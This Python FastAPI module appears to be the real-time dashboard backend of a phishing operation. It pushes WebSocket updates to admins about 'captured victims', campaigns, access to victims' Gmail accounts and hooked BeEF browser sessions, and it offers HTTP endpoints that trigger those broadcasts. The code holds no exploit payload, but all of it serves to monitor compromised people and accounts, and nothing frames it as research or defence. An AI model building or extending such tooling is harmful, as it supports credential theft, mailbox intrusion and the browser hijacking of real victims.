"""
WebSocket Real-time Updates
Real-time dashboard updates and notifications
"""

import logging
import json
import asyncio
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any, Set
from fastapi import APIRouter, WebSocket, WebSocketDisconnect, Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

from database.mongodb.victims import VictimModel
from database.mongodb.campaigns import CampaignModel
from database.mongodb.activity_logs import ActivityLogModel
from database.mongodb.gmail_access_logs import GmailAccessLogModel
from database.mongodb.beef_sessions import BeEFSessionModel
from middleware.authentication import verify_admin_token

logger = logging.getLogger(__name__)

router = APIRouter()
security = HTTPBearer()

# Connection manager for WebSocket connections
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, Set[WebSocket]] = {}
        self.admin_connections: Dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket, admin_id: str, connection_type: str = "dashboard"):
        """Accept WebSocket connection and add to appropriate group"""
        await websocket.accept()
        
        # Add to admin connections
        self.admin_connections[admin_id] = websocket
        
        # Add to connection type group
        if connection_type not in self.active_connections:
            self.active_connections[connection_type] = set()
        self.active_connections[connection_type].add(websocket)
        
        logger.info(f"WebSocket connected: {admin_id} ({connection_type})")

    def disconnect(self, websocket: WebSocket, admin_id: str, connection_type: str = "dashboard"):
        """Remove WebSocket connection"""
        # Remove from admin connections
        if admin_id in self.admin_connections:
            del self.admin_connections[admin_id]
        
        # Remove from connection type group
        if connection_type in self.active_connections:
            self.active_connections[connection_type].discard(websocket)
        
        logger.info(f"WebSocket disconnected: {admin_id} ({connection_type})")

    async def send_personal_message(self, message: str, websocket: WebSocket):
        """Send message to specific WebSocket"""
        try:
            await websocket.send_text(message)
        except Exception as e:
            logger.error(f"Error sending personal message: {e}")

    async def send_to_admin(self, message: str, admin_id: str):
        """Send message to specific admin"""
        if admin_id in self.admin_connections:
            websocket = self.admin_connections[admin_id]
            await self.send_personal_message(message, websocket)

    async def broadcast_to_type(self, message: str, connection_type: str):
        """Broadcast message to all connections of specific type"""
        if connection_type in self.active_connections:
            disconnected = set()
            for websocket in self.active_connections[connection_type]:
                try:
                    await websocket.send_text(message)
                except Exception as e:
                    logger.error(f"Error broadcasting to {connection_type}: {e}")
                    disconnected.add(websocket)
            
            # Remove disconnected connections
            self.active_connections[connection_type] -= disconnected

    async def broadcast_to_all(self, message: str):
        """Broadcast message to all connected clients"""
        for connection_type in self.active_connections:
            await self.broadcast_to_type(message, connection_type)

# Global connection manager
manager = ConnectionManager()

# WebSocket message types
class MessageType:
    VICTIM_CAPTURED = "victim_captured"
    CAMPAIGN_UPDATE = "campaign_update"
    GMAIL_ACCESS = "gmail_access"
    BEEF_SESSION = "beef_session"
    ACTIVITY_LOG = "activity_log"
    SYSTEM_ALERT = "system_alert"
    STATISTICS_UPDATE = "statistics_update"
    HEARTBEAT = "heartbeat"

async def verify_websocket_token(websocket: WebSocket, token: str) -> Optional[Dict[str, Any]]:
    """Verify WebSocket authentication token"""
    try:
        # Remove "Bearer " prefix if present
        if token.startswith("Bearer "):
            token = token[7:]
        
        # Verify token
        admin_data = await verify_admin_token(token)
        if admin_data:
            return admin_data
        else:
            await websocket.close(code=1008, reason="Invalid authentication token")
            return None
    except Exception as e:
        logger.error(f"WebSocket authentication error: {e}")
        await websocket.close(code=1008, reason="Authentication failed")
        return None

@router.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket, token: str = None):
    """WebSocket endpoint for dashboard real-time updates"""
    try:
        # Verify authentication
        admin_data = await verify_websocket_token(websocket, token)
        if not admin_data:
            return
        
        admin_id = admin_data["admin_id"]
        
        # Connect to dashboard group
        await manager.connect(websocket, admin_id, "dashboard")
        
        try:
            # Send initial dashboard data
            await send_initial_dashboard_data(websocket, admin_id)
            
            # Start heartbeat
            heartbeat_task = asyncio.create_task(heartbeat_loop(websocket))
            
            # Listen for messages
            while True:
                try:
                    data = await websocket.receive_text()
                    message = json.loads(data)
                    await handle_dashboard_message(websocket, admin_id, message)
                except WebSocketDisconnect:
                    break
                except Exception as e:
                    logger.error(f"Error handling dashboard message: {e}")
                    await websocket.send_text(json.dumps({
                        "type": "error",
                        "message": "Error processing message"
                    }))
        
        finally:
            # Cleanup
            heartbeat_task.cancel()
            manager.disconnect(websocket, admin_id, "dashboard")
            
    except WebSocketDisconnect:
        logger.info("Dashboard WebSocket disconnected")
    except Exception as e:
        logger.error(f"Dashboard WebSocket error: {e}")

@router.websocket("/ws/gmail")
async def websocket_gmail(websocket: WebSocket, token: str = None):
    """WebSocket endpoint for Gmail access real-time updates"""
    try:
        # Verify authentication
        admin_data = await verify_websocket_token(websocket, token)
        if not admin_data:
            return
        
        admin_id = admin_data["admin_id"]
        
        # Connect to Gmail group
        await manager.connect(websocket, admin_id, "gmail")
        
        try:
            # Send initial Gmail data
            await send_initial_gmail_data(websocket, admin_id)
            
            # Listen for messages
            while True:
                try:
                    data = await websocket.receive_text()
                    message = json.loads(data)
                    await handle_gmail_message(websocket, admin_id, message)
                except WebSocketDisconnect:
                    break
                except Exception as e:
                    logger.error(f"Error handling Gmail message: {e}")
                    await websocket.send_text(json.dumps({
                        "type": "error",
                        "message": "Error processing message"
                    }))
        
        finally:
            manager.disconnect(websocket, admin_id, "gmail")
            
    except WebSocketDisconnect:
        logger.info("Gmail WebSocket disconnected")
    except Exception as e:
        logger.error(f"Gmail WebSocket error: {e}")

@router.websocket("/ws/beef")
async def websocket_beef(websocket: WebSocket, token: str = None):
    """WebSocket endpoint for BeEF real-time updates"""
    try:
        # Verify authentication
        admin_data = await verify_websocket_token(websocket, token)
        if not admin_data:
            return
        
        admin_id = admin_data["admin_id"]
        
        # Connect to BeEF group
        await manager.connect(websocket, admin_id, "beef")
        
        try:
            # Send initial BeEF data
            await send_initial_beef_data(websocket, admin_id)
            
            # Listen for messages
            while True:
                try:
                    data = await websocket.receive_text()
                    message = json.loads(data)
                    await handle_beef_message(websocket, admin_id, message)
                except WebSocketDisconnect:
                    break
                except Exception as e:
                    logger.error(f"Error handling BeEF message: {e}")
                    await websocket.send_text(json.dumps({
                        "type": "error",
                        "message": "Error processing message"
                    }))
        
        finally:
            manager.disconnect(websocket, admin_id, "beef")
            
    except WebSocketDisconnect:
        logger.info("BeEF WebSocket disconnected")
    except Exception as e:
        logger.error(f"BeEF WebSocket error: {e}")

async def send_initial_dashboard_data(websocket: WebSocket, admin_id: str):
    """Send initial dashboard data to WebSocket"""
    try:
        # Get initial statistics
        victim_model = VictimModel()
        campaign_model = CampaignModel()
        activity_model = ActivityLogModel()
        
        # Get basic stats
        total_victims = await victim_model.count_total_victims()
        active_victims = await victim_model.count_active_victims()
        total_campaigns = await campaign_model.count_total_campaigns()
        active_campaigns = await campaign_model.count_active_campaigns()
        
        # Get recent activities
        recent_activities = await activity_model.get_recent_activities(limit=5)
        
        initial_data = {
            "type": "initial_data",
            "data": {
                "statistics": {
                    "total_victims": total_victims,
                    "active_victims": active_victims,
                    "total_campaigns": total_campaigns,
                    "active_campaigns": active_campaigns
                },
                "recent_activities": recent_activities,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        await websocket.send_text(json.dumps(initial_data))
        
    except Exception as e:
        logger.error(f"Error sending initial dashboard data: {e}")

async def send_initial_gmail_data(websocket: WebSocket, admin_id: str):
    """Send initial Gmail data to WebSocket"""
    try:
        gmail_model = GmailAccessLogModel()
        
        # Get recent Gmail access logs
        recent_logs = await gmail_model.get_recent_access_logs(limit=10)
        
        initial_data = {
            "type": "initial_gmail_data",
            "data": {
                "recent_access_logs": recent_logs,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        await websocket.send_text(json.dumps(initial_data))
        
    except Exception as e:
        logger.error(f"Error sending initial Gmail data: {e}")

async def send_initial_beef_data(websocket: WebSocket, admin_id: str):
    """Send initial BeEF data to WebSocket"""
    try:
        beef_model = BeEFSessionModel()
        
        # Get active BeEF sessions
        active_sessions = await beef_model.get_active_sessions()
        
        initial_data = {
            "type": "initial_beef_data",
            "data": {
                "active_sessions": active_sessions,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        await websocket.send_text(json.dumps(initial_data))
        
    except Exception as e:
        logger.error(f"Error sending initial BeEF data: {e}")

async def handle_dashboard_message(websocket: WebSocket, admin_id: str, message: Dict[str, Any]):
    """Handle dashboard WebSocket messages"""
    message_type = message.get("type")
    
    if message_type == "request_update":
        # Send current statistics
        await send_statistics_update(websocket)
    elif message_type == "subscribe_to_victims":
        # Subscribe to victim updates
        await websocket.send_text(json.dumps({
            "type": "subscription_confirmed",
            "subscription": "victims"
        }))
    elif message_type == "subscribe_to_campaigns":
        # Subscribe to campaign updates
        await websocket.send_text(json.dumps({
            "type": "subscription_confirmed",
            "subscription": "campaigns"
        }))

async def handle_gmail_message(websocket: WebSocket, admin_id: str, message: Dict[str, Any]):
    """Handle Gmail WebSocket messages"""
    message_type = message.get("type")
    
    if message_type == "request_gmail_update":
        # Send current Gmail data
        await send_gmail_update(websocket)
    elif message_type == "subscribe_to_gmail":
        # Subscribe to Gmail updates
        await websocket.send_text(json.dumps({
            "type": "subscription_confirmed",
            "subscription": "gmail"
        }))

async def handle_beef_message(websocket: WebSocket, admin_id: str, message: Dict[str, Any]):
    """Handle BeEF WebSocket messages"""
    message_type = message.get("type")
    
    if message_type == "request_beef_update":
        # Send current BeEF data
        await send_beef_update(websocket)
    elif message_type == "subscribe_to_beef":
        # Subscribe to BeEF updates
        await websocket.send_text(json.dumps({
            "type": "subscription_confirmed",
            "subscription": "beef"
        }))

async def send_statistics_update(websocket: WebSocket):
    """Send statistics update to WebSocket"""
    try:
        victim_model = VictimModel()
        campaign_model = CampaignModel()
        
        # Get current statistics
        total_victims = await victim_model.count_total_victims()
        active_victims = await victim_model.count_active_victims()
        total_campaigns = await campaign_model.count_total_campaigns()
        active_campaigns = await campaign_model.count_active_campaigns()
        
        update_data = {
            "type": MessageType.STATISTICS_UPDATE,
            "data": {
                "statistics": {
                    "total_victims": total_victims,
                    "active_victims": active_victims,
                    "total_campaigns": total_campaigns,
                    "active_campaigns": active_campaigns
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        await websocket.send_text(json.dumps(update_data))
        
    except Exception as e:
        logger.error(f"Error sending statistics update: {e}")

async def send_gmail_update(websocket: WebSocket):
    """Send Gmail update to WebSocket"""
    try:
        gmail_model = GmailAccessLogModel()
        
        # Get recent Gmail access logs
        recent_logs = await gmail_model.get_recent_access_logs(limit=5)
        
        update_data = {
            "type": MessageType.GMAIL_ACCESS,
            "data": {
                "recent_access_logs": recent_logs,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        await websocket.send_text(json.dumps(update_data))
        
    except Exception as e:
        logger.error(f"Error sending Gmail update: {e}")

async def send_beef_update(websocket: WebSocket):
    """Send BeEF update to WebSocket"""
    try:
        beef_model = BeEFSessionModel()
        
        # Get active BeEF sessions
        active_sessions = await beef_model.get_active_sessions()
        
        update_data = {
            "type": MessageType.BEEF_SESSION,
            "data": {
                "active_sessions": active_sessions,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        }
        
        await websocket.send_text(json.dumps(update_data))
        
    except Exception as e:
        logger.error(f"Error sending BeEF update: {e}")

async def heartbeat_loop(websocket: WebSocket):
    """Send heartbeat messages to keep connection alive"""
    try:
        while True:
            await asyncio.sleep(30)  # Send heartbeat every 30 seconds
            heartbeat_data = {
                "type": MessageType.HEARTBEAT,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            await websocket.send_text(json.dumps(heartbeat_data))
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Error in heartbeat loop: {e}")

# Broadcast functions for real-time updates
async def broadcast_victim_captured(victim_data: Dict[str, Any]):
    """Broadcast victim captured event"""
    message = {
        "type": MessageType.VICTIM_CAPTURED,
        "data": victim_data,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await manager.broadcast_to_type(json.dumps(message), "dashboard")

async def broadcast_campaign_update(campaign_data: Dict[str, Any]):
    """Broadcast campaign update event"""
    message = {
        "type": MessageType.CAMPAIGN_UPDATE,
        "data": campaign_data,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await manager.broadcast_to_type(json.dumps(message), "dashboard")

async def broadcast_gmail_access(gmail_data: Dict[str, Any]):
    """Broadcast Gmail access event"""
    message = {
        "type": MessageType.GMAIL_ACCESS,
        "data": gmail_data,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await manager.broadcast_to_type(json.dumps(message), "gmail")

async def broadcast_beef_session(beef_data: Dict[str, Any]):
    """Broadcast BeEF session event"""
    message = {
        "type": MessageType.BEEF_SESSION,
        "data": beef_data,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await manager.broadcast_to_type(json.dumps(message), "beef")

async def broadcast_activity_log(activity_data: Dict[str, Any]):
    """Broadcast activity log event"""
    message = {
        "type": MessageType.ACTIVITY_LOG,
        "data": activity_data,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await manager.broadcast_to_all(json.dumps(message))

async def broadcast_system_alert(alert_data: Dict[str, Any]):
    """Broadcast system alert"""
    message = {
        "type": MessageType.SYSTEM_ALERT,
        "data": alert_data,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    await manager.broadcast_to_all(json.dumps(message))

# HTTP endpoints for triggering broadcasts
@router.post("/broadcast/victim-captured")
async def trigger_victim_captured_broadcast(
    victim_data: Dict[str, Any],
    current_admin: dict = Depends(verify_admin_token)
):
    """Trigger victim captured broadcast"""
    await broadcast_victim_captured(victim_data)
    return {"success": True, "message": "Victim captured broadcast sent"}

@router.post("/broadcast/campaign-update")
async def trigger_campaign_update_broadcast(
    campaign_data: Dict[str, Any],
    current_admin: dict = Depends(verify_admin_token)
):
    """Trigger campaign update broadcast"""
    await broadcast_campaign_update(campaign_data)
    return {"success": True, "message": "Campaign update broadcast sent"}

@router.post("/broadcast/gmail-access")
async def trigger_gmail_access_broadcast(
    gmail_data: Dict[str, Any],
    current_admin: dict = Depends(verify_admin_token)
):
    """Trigger Gmail access broadcast"""
    await broadcast_gmail_access(gmail_data)
    return {"success": True, "message": "Gmail access broadcast sent"}

@router.post("/broadcast/beef-session")
async def trigger_beef_session_broadcast(
    beef_data: Dict[str, Any],
    current_admin: dict = Depends(verify_admin_token)
):
    """Trigger BeEF session broadcast"""
    await broadcast_beef_session(beef_data)
    return {"success": True, "message": "BeEF session broadcast sent"}

@router.post("/broadcast/activity-log")
async def trigger_activity_log_broadcast(
    activity_data: Dict[str, Any],
    current_admin: dict = Depends(verify_admin_token)
):
    """Trigger activity log broadcast"""
    await broadcast_activity_log(activity_data)
    return {"success": True, "message": "Activity log broadcast sent"}

@router.post("/broadcast/system-alert")
async def trigger_system_alert_broadcast(
    alert_data: Dict[str, Any],
    current_admin: dict = Depends(verify_admin_token)
):
    """Trigger system alert broadcast"""
    await broadcast_system_alert(alert_data)
    return {"success": True, "message": "System alert broadcast sent"}
